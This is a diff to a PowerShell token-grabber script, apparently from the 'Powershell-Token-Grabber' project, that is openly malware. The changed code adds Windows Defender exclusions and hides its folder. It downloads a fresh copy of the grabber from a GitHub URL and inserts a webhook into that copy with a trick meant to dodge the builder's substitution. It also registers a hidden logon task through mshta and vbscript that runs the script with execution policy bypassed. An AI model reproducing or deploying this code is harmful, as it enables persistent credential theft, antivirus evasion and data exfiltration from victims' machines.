@@ -6,7 +6,6 @@ function CHECK_IF_ADMIN {
 }
 
 function EXFILTRATE-DATA {
-    $webhook = "YOUR_WEBHOOK_HERE"
     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
     $ip > $env:LOCALAPPDATA\Temp\ip.txt
@@ -446,6 +445,8 @@ function EXFILTRATE-DATA {
     Remove-Item "$extracted\main.exe"
 }
 
+$webhook = "YOUR_WEBHOOK_HERE"
+
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
@@ -455,8 +456,16 @@ function Invoke-TASKS {
 	$KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
     $KDOT_DIR.attributes="Hidden","System"
     
-	$origin = $PSCommandPath
-    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
+	#$origin = $PSCommandPath
+    #Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
+    #download new grabber
+    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1", "$env:APPDATA\KDOT\KDOT.ps1")
+    #replace YOUR_WEBHOOK_HERE with the webhook
+    $inputstuff = Get-Content "$env:APPDATA\KDOT\KDOT.ps1"
+    #IM USING [CHAR]89 TO REPLACE THE Y SO THE BUILDER DOESN'T REPLACE IT
+    $to_replace = [char]89 + "OUR_WEBHOOK_HERE"
+    $inputstuff = $inputstuff -replace "$to_replace", "$webhook"
+    $inputstuff | Set-Content "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
